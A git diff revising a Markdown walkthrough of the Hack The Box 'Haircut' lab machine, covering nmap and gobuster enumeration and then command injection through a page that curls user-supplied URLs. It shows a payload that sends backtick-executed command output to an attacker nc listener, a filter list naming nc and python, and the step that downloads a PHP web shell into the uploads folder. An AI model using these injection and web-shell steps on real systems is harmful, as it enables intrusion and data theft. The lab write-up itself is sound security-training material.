@@ -8,7 +8,7 @@ IP: 10.10.10.24
 
 Difficulty: Medium
 
-## Enumeration
+## Initial enumeration
 [Nmap](https://github.com/nmap/nmap) scan on the target:
 
 `nmap -sV -sC -oN shocker.nmap 10.10.10.24`
@@ -65,9 +65,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Found `/uploads` that is referenced by the image that appears on the page already.
+Interesting, there's an `/uploads` directory. Despite it does not seem very useful now, it may come handy in the future.
 
-After checking several lists and ways of enumerating directories, finally this one got `/exposed.php`:
+After trying with several other lists, finally this one got a more intereseting result:
 
 ```
 root@kali:~/htb/haircut# gobuster dir --url 10.10.10.24 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
@@ -89,30 +89,25 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /exposed.php (Status: 200)
 ```
 
-The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some command but some symbols/keywords were blocked e.g. &, ;, |, python and nc. Curl flags are not blocked, though.
+The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some commands but some symbols/keywords were blocked by the back-end e.g. &, ;, |, python and nc. Curl flags were not blocked, though.
 
-Checking `curl` man's page for ways to get more information about the system or executing arbitrary code, I thought of sending information through body data of a curl request sent to a `nc` listener on the attacker machine.
+## Discovery/Exploitation
+Checking `curl` man page for ways to get more information on the system or executing arbitrary code, I thought that using curl's request body (-d) could be an acceptable way of transmitting info to a listener. By leveraging backticks, commands can be executed and their results would be sent back to our listener.
 
-Set up listener from attacker: 
+Set up listener in attacker machine: 
 ```
 nc -lvp 4444
 ```
 
-Commands now can be executed from the input as follows, and the result of the executed command will be passed as data to the listener:
+Commands now can be executed from the input of the `/exposed.php` page as follows, and the result of the executed command will be passed as data to the listener:
 ```
-$ATTACKERIP:4444 -d "`command goes here`"
+$IP_ATTACKER:4444 -d "`command goes here`"
 ```
+With this we can get the following:
+- `whoami` returns `www-data`.
+- It is possible to even get the user flag already!: ```cat /home/maria/Desktop/user``` (always check `/home` for getting users)
 
-So, the next couple of commands I'll list here will use this trick.
-
-If command is `whoami`, the listener will print `www-data`.
-
-It is possible to get the user flag already from here the same way:
-```
-cat /home/maria/Desktop/user
-```
-
-It may be a good idea to try to get a more steady shell. See what files/folders are present:
+Let's try now to get a more steady shell. See what files/folders are present:
 ```
 ls -alh
 ```
@@ -131,14 +126,16 @@ drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
 drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
 ```
 
-It seems `uploads` may be a good place where to place a web shell. I'm going to use a PHP web shell called `Predator.php` present in this repo https://github.com/JohnTroony/php-webshells.git. The first step is to make the shell "curleable" by exposing it through an http server in the attacker:
+It seems `uploads` may be a good place to place a web shell as `www-data` has write permissions on it. I'm going to use a PHP web shell called `Predator.php` present in this repo https://github.com/JohnTroony/php-webshells.git. Note that I use that one because I wanted to check it out, but other much simpler ones would be enough.
+
+The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an http server in the attacker:
 ```
 $ cd php-webshells
 $ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-And now from the input in `/exposed.php` we curl it to uploads leveraging the `-o` (output file) flag (this time without the trick to execute commands from the input as we are just using curl as it is to fetch the shell):
+And now from `/exposed.php` we curl it sending the file to `/uploads` leveraging the `-o` (output file) flag:
 ```
 10.10.14.23:8000/Predator.php -o uploads/Predator.php
 ```
